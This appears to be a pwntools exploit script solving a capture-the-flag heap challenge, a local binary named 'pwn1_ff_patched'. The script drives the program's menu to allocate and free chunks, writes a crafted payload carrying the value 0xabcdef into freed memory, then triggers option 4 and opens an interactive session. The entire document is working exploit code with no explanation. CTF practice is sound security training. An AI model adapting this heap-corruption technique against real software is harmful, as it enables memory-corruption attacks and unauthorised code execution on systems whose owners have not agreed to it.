from pwn import *
context.binary=exe=ELF("./pwn1_ff_patched",checksec=False)
p=process(exe.path)

p.sendlineafter(b">\n",b'1')
p.sendlineafter(b"Input size:",b"50")
p.sendlineafter(b"Input data:",b"AAAA")
p.sendlineafter(b">\n",b'1')
p.sendlineafter(b"Input size:",b"40")
p.sendlineafter(b"Input data:",b"AAAA")
payload=b"\x00"*8+b"\xef\xcd\xab"+b"\x00"*5
p.sendlineafter(b">\n",b'1')
p.sendlineafter(b"Input size:",b"16")
p.sendlineafter(b"Input data:",payload)
p.sendlineafter(b">\n",b'2')
p.sendlineafter(b"Input index:",b"2")
p.sendlineafter(b">\n",b'1')
p.sendlineafter(b"Input size:",b"16")
p.sendlineafter(b"Input data:",b"GOTHAMISMINE")
payload=b"\x00"*8+p64(0xabcdef)

p.sendlineafter(b">\n",b'4')
p.interactive()